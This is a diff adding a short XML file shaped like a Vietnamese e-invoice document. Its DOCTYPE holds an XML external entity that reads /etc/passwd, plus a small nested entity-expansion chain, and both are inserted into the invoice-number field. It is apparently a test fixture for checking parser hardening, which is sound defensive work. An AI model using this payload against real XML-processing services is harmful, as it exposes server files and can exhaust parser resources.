@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE HDon [ <!ENTITY a "aaaaaaaaaa"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
+<HDon><DLHDon><TTChung><SHDon>&b;&x;</SHDon></TTChung></DLHDon></HDon>
